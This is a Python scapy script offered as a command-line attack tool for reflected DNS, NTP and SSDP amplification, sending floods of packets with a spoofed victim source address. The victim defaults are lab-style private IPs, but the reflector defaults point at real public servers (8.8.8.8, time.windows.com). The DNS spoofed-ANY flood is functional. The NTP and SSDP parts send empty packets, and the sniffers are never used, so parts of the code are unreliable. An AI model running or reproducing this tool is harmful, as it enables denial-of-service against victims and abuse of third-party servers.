#!/usr/bin/env python3
import argparse
import os
import socket
import time
from scapy.all import *


def get_iface_for_ip(target_ip):
    route = conf.route.route(target_ip)
    return route[0]  

"""
target_ip = "192.168.56.105"
server_ip = "192.168.56.106"
"""

def dns_amplification(victim_ip, server_ip, iface):

    print(f"Starting DNS Amplification Reflected Attack")

    ip_layer = IP(src=victim_ip, dst=server_ip)
    udp_layer = UDP(sport=RandShort(), dport=53)
    dns_layer = DNS(rd=1, qd=DNSQR(qname="google.com", qtype=255))

    packet = ip_layer / udp_layer / dns_layer

    sniffer = AsyncSniffer(iface=iface, filter=f"udp port 53 or icmp", store=True)
    sniffer.start()
    time.sleep(1)

    print("Sending 200 DNS Packets...")
    for i in range(200):
        send(packet, iface=iface, verbose=0)


def ntp_amplification(victim_ip, server_ip, iface):

    print(f"Starting NTP Amplification Reflected Attack")

    ip_layer = IP(src=victim_ip, dst=server_ip)
    udp_layer = UDP(sport=RandShort(), dport=123)
  
    packet = ip_layer / udp_layer

    sniffer = AsyncSniffer(iface=iface, filter=f"udp port 123 or icmp", store=True)
    sniffer.start()
    time.sleep(1)

    print("Sending a flood of 200 NTP Packets...")
    for i in range(200):
        send(packet, iface=iface, verbose=0)



def ssdp_amplification(victim_ip, server_ip, iface):

    print(f"Starting SSDP Amplification Reflected Attack")
    print(f"Sniffing on interface: {iface}")

    ip_layer = IP(src=victim_ip, dst=server_ip)
    udp_layer = UDP(sport=RandShort(), dport=1900)

    packet = ip_layer / udp_layer

    sniffer = AsyncSniffer(iface=iface, filter=f"udp port 1900 or icmp", store=True)
    sniffer.start()
    time.sleep(1)

    print("Sending a flood of 200 SSDP Packets...")
    for i in range(200):
        send(packet, iface=iface, verbose=0)

    time.sleep(3)

def main():
    parser = argparse.ArgumentParser(
    )
    parser.add_argument("attack", choices=["dns", "ntp", "ssdp", "all"],
                        help="Type of attack to perform")
    parser.add_argument("--victim",default="192.168.56.105",
                        help="IP address of the victim (spoofed source IP)")
    parser.add_argument("--dns-server", default="8.8.8.8",
                        help="IP address of the DNS Server (reflector)")
    parser.add_argument("--ntp-server", default="time.windows.com",
                        help="IP address of the NTP Server (reflector)")
    parser.add_argument("--ssdp-server", default="192.168.56.106",
                        help="IP address of the SSDP Multicast (reflector)")

    args = parser.parse_args()

    conf.verb = 0

    iface = get_iface_for_ip(args.dns_server if args.attack in ["dns", "all"] else
                             args.ntp_server if args.attack == "ntp" else
                             args.ssdp_server)
    print(f"Auto-detected interface: {iface}\n")

    if args.attack in ["dns", "all"]:
        dns_amplification(args.victim, args.dns_server, iface)

    if args.attack in ["ntp", "all"]:
        try:
            ntp_ip = socket.gethostbyname(args.ntp_server)
        except Exception:
            ntp_ip = args.ntp_server
        ntp_amplification(args.victim, ntp_ip, iface)

    if args.attack in ["ssdp", "all"]:
        ssdp_amplification(args.victim, args.ssdp_server, iface)


if __name__ == "__main__":
    if os.getuid() != 0:
        print("sudo required")
    main()
